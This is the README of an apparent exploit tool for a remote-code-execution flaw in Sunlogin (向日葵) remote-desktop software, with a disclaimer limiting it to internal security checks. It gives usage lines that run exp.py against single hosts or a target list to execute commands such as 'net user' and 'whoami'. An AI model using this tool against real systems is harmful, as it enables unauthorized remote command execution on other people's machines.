# 向日葵RCE漏洞批量检测工具

## 使用需知
仅供企业内部安全隐患排查使用

由于传播、利用此工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

## 功能
v1.1 批量漏洞检测

v1.0 单IP检测


## 使用方法
```shell
Usage: python exp.py -i [--host] -p [--port] -c [--command] -f [--file]
python exp.py -i 127.0.0.1 -p 20038 -c "net user" 
python exp.py  -f targets.txt -c "whoami"
```

## 运行图
![image-20220222161716318](https://cdn.jsdelivr.net/gh/j2ekim/blog-image/image/image-20220222161716318.png)

![image-20220222161815564](https://cdn.jsdelivr.net/gh/j2ekim/blog-image/image/image-20220222161815564.png)

